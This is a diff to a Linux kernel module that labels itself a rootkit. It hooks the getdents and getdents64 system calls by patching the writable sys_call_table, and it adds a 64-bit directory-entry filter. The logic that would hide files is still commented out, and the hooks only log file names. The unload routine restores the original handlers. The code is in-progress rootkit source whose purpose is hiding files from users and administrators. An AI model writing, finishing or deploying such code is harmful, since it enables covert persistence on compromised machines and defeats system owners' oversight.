@@ -4,6 +4,7 @@
 #include <linux/kthread.h>
 #include <linux/delay.h>
 #include <linux/kallsyms.h>
+#include <linux/dirent.h>
 #include <linux/unistd.h>    /* __NR_* system call indicies */
 #include <asm/pgtable.h>     /* pte_mkwrite */
 
@@ -21,34 +22,36 @@ struct linux_dirent {
 	/*
 	char           pad;       // Zero padding byte
 	char           d_type;    // File type (only since Linux 2.6.4;
-				  // offset is (d_reclen - 1))
+				  // offsett is (d_reclen - 1))
 	*/
 };
 
 static inline int filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_dirent));
+static inline int filter_out64(struct linux_dirent64 *dirp, int length, int (*pred)(struct linux_dirent64));
 static inline int filter_fn(struct linux_dirent d);
+static inline int filter_fn64(struct linux_dirent64 d);
 
-asmlinkage int (*real_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-asmlinkage int (*real_getdents64)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage int (*real_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
+asmlinkage int (*real_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 
-asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+asmlinkage int new_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count) {
 	int length;
 	pr_info("ROOTKIT hooked call to new_getdents");
 	length = real_getdents(fd, dirp, count);
 	
-	if (length == -1 || length == 0) return length;
+	if (length <= 0) return length;
 	
 	return filter_out(dirp, length, &filter_fn);
 }
 
-asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
 	int length;
 	pr_info("ROOTKIT hooked call to new_getdents64");
 	length = real_getdents64(fd, dirp, count);
 	
-	if (length == -1 || length == 0) return length;
+	if (length <= 0) return length;
 	
-	return filter_out(dirp, length, &filter_fn);
+	return filter_out64(dirp, length, &filter_fn64);
 }
 
 static inline int filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_dirent)) {
@@ -78,7 +81,40 @@ static inline int filter_out(struct linux_dirent *dirp, int length, int (*pred)(
 	return length;
 }
 
+static inline int filter_out64(struct linux_dirent64 *dirp, int length, int (*pred)(struct linux_dirent64)) {
+	int index = 0;
+	int index_copyto = -1;
+	unsigned short reclen;
+	// Why ints? Because getdents[64] returns an int.
+	
+	while (index < length) {
+		reclen = (*(dirp+index)).d_reclen;
+		pred(*(dirp+index));
+		
+		/*if (!pred(*(dirp+index))) {
+			length -= reclen;
+			
+			if (index_copyto != -1) {
+				index_copyto = index;
+			}
+		} else if (index_copyto != -1 && index_copyto != index) {
+			memmove(dirp+index_copyto, dirp+index, reclen);
+			index_copyto += reclen;
+		}*/
+		
+		index += reclen;
+	}
+	
+	return length;
+}
+
 static inline int filter_fn(struct linux_dirent d) {
+	pr_info("%s", d.d_name);
+	
+	return 0;
+}
+
+static inline int filter_fn64(struct linux_dirent64 d) {
 	pr_info("%s", d.d_name);
 	
 	return 0;
@@ -175,13 +211,12 @@ static void __exit my_exit(void)
 	kthread_stop(kt);
 
 	if (syscall_table != NULL) {
+		pte->pte |= _PAGE_RW;
 
-        pte->pte |= _PAGE_RW;
+		syscall_table[__NR_getdents] = (unsigned long)real_getdents;
+		syscall_table[__NR_getdents64] = (unsigned long)real_getdents64;
 
-        syscall_table[__NR_getdents] = (unsigned long)real_getdents;
-        syscall_table[__NR_getdents64] = (unsigned long)real_getdents64;
-
-        pte->pte &= ~_PAGE_RW;
+		pte->pte &= ~_PAGE_RW;
 
 		printk(KERN_EMERG "ROOTKIT sys_call_table unhooked\n");
 	} else {
